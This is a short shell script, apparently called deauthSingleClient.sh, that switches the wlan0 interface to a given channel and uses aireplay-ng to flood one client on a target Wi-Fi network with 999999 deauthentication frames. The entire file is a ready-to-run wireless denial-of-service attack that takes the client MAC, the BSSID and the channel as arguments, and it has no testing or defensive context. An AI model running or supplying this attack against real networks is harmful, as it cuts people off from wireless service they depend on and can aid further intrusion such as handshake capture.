if [ -z "$1" ]
then
	echo "Usage: deauthSingleClient.sh <clientMac> <Network BSSID> <channel>"
else
	iwconfig wlan0 channel $3
	aireplay-ng --deauth 999999 -a $2 -c $1 wlan0  
fi

